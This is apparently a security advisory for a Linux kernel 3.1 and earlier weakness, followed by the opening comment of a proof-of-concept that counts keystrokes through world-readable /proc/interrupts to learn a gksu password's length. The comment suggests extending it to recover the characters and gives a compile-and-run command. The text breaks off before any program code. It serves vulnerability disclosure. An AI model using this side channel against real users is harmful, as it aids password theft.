The Linux kernel is prone to a local information-disclosure weakness.

Successful exploits allow local attackers to obtain the password length of a victim's account; information harvested may aid in further attacks.

Linux kernel 3.1 and prior are vulnerable.

/*
 * A PoC for spying for keystrokes in gksu via /proc/interrupts in Linux <= 3.1.
 *
 * The file /proc/interrupts is world readable.  It contains information
 * about how many interrupts were emitted since the system boot.  We may loop
 * on one CPU core while the victim is executed on another, and learn the length
 * of victim's passord via monitoring emitted interrupts' counters of the keyboard
 * interrupt.  The PoC counts only keystrokes number, but it can be easily extended
 * to note the delays between the keystrokes and do the statistical analysis to
 * learn the precise input characters.
 *
 * The limitations:
 *   - it works on 2-core CPUs only.
 *   - it works on 1-keyboard systems only.
 *   - it doesn't carefully count the first and last keystrokes (e.g. ENTER after
 *     the password input).
 *   - it doesn't carefully filter keystrokes after ENTER.
 *
 * by segoon from Openwall
 *
 * run as: gcc -Wall spy-interrupts.c -o spy-interrupts && ./spy-interrupts gksu
 *
 * P.S.  The harm of 0444 /proc/interrupts is known for a long time, but I
 * was told about this specific attack vector by Tavis Ormandy just after similar
 * PoC spy-sched was published.
